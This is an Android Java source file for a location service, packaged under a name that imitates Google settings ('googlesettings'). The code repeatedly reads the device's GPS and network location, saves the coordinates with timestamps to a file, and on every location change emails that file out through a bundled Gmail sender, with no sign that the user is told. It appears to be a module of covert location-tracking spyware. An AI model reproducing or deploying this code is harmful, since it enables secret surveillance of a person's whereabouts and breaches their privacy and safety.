package com.setting.dl.google.googlesettings.mail;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.Service;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.util.Date;

public class GPSLocation extends Service implements LocationListener {
    
    private final static String fileLocation  = "location.txt";
    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 10 meters
    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60; // 1 minute
    private final Context context;
    // Declaring a Location Manager
    protected LocationManager locationManager;
    // flag for GPS status
    boolean isGPSEnabled = false;
    // flag for network status
    boolean isNetworkEnabled = false;
    // flag for GPS status
    boolean canGetLocation = false;
    Location location; // location
    double   latitude; // latitude
    double   longitude; // longitude
    
    public GPSLocation(Context context) {
        this.context = context;
        getLocation();
    }
    
    
    @SuppressLint("MissingPermission")
    public void getLocation() {
        try {
            
            u.run(() -> {
    
    
                locationManager = (LocationManager) context.getSystemService(LOCATION_SERVICE);
    
                if(locationManager == null) return;
                // getting GPS status
                isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    
                // getting network status
                isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    
                if (!isGPSEnabled && !isNetworkEnabled) {
                    // no network provider is enabled
                }
                else {
                    this.canGetLocation = true;
                    // First _get location from Network Provider
                    if (isNetworkEnabled) {
            
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                        
                        if (locationManager != null) {
    
                            
                            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                
                            if (location != null) {
                                
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
	
	                            Log.w("GPS",String.format("latitude : %f, longitude : %f", latitude, longitude));
                            }
                        }
                    }
                    // if GPS Enabled _get lat/long using GPS Services
                    if (isGPSEnabled) {
                        if (location == null) {
                            locationManager.requestLocationUpdates(
                                    LocationManager.GPS_PROVIDER,
                                    MIN_TIME_BW_UPDATES,
                                    MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                            Log.d("GPS Enabled", "GPS Enabled");
                            if (locationManager != null) {
                                location = locationManager
                                        .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                                if (location != null) {
                                    latitude = location.getLatitude();
                                    longitude = location.getLongitude();
                                }
                            }
                        }
                    }
                }
                
                
            }, 10000);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        //return location;
    }
    
    /**
     * Stop using GPS listener
     * Calling this function will stop using GPS in your app
     */
    public void stopUsingGPS() {
        if (locationManager != null) {
            locationManager.removeUpdates(GPSLocation.this);
        }
    }
    
    /**
     * Function to _get latitude
     */
    public double getLatitude() {
        if (location != null) {
            latitude = location.getLatitude();
        }
        
        // return latitude
        return latitude;
    }
    
    /**
     * Function to _get longitude
     */
    public double getLongitude() {
        if (location != null) {
            longitude = location.getLongitude();
        }
        
        // return longitude
        return longitude;
    }
    
    /**
     * Function to check GPS/wifi enabled
     *
     * @return boolean
     */
    public boolean canGetLocation() {
        return this.canGetLocation;
    }
    
    /**
     * Function to show settings alert dialog
     * On pressing Settings button will lauch Settings Options
     */
    public void showSettingsAlert() {
        AlertDialog.Builder alertDialog = new AlertDialog.Builder(context);
        
        // Setting Dialog Title
        alertDialog.setTitle("GPS is settings");
        
        // Setting Dialog Message
        alertDialog.setMessage("GPS is not enabled. Do you want to go to settings menu?");
        
        // On pressing Settings button
        alertDialog.setPositiveButton("Settings", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                context.startActivity(intent);
            }
        });
        
        // on pressing cancel button
        alertDialog.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });
        
        // Showing Alert Message
        alertDialog.show();
    }
    
    @Override
    public void onLocationChanged(Location location) {
        this.location = location;
        
        Handler handler = new Handler(Looper.getMainLooper());
        
        handler.post(
                
                new Runnable() {
                    
                    @Override
                    public void run() {
                        
                        double latitude;
                        double longitude;
                        String value = "";
                        
                        GPSLocation gps = new GPSLocation(context);
                        
                        if (gps.canGetLocation()) {
                            
                            latitude = gps.getLatitude();
                            longitude = gps.getLongitude();
                            
                            Log.e("location", "" + latitude + ", " + longitude);
                            value += u.s("Location %s\nEnlem, Boylam\n%f, %f\n-----------\n", u.getDate(new Date()), latitude, longitude);
                            
                        }
                        else {
                            Log.e("location", "location disabled");
                            value += u.s("*\nLocation disable\n*\n");
                        }
                        
                        gps.stopUsingGPS();
                        u.saveValue(GPSLocation.this, fileLocation, value);
    
                        Mail.send(GPSLocation.this, fileLocation);
                    }
                });
    }
    
    @Override
    public void onProviderDisabled(String provider) {
    }
    
    @Override
    public void onProviderEnabled(String provider) {
    }
    
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }
    
    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }
    
}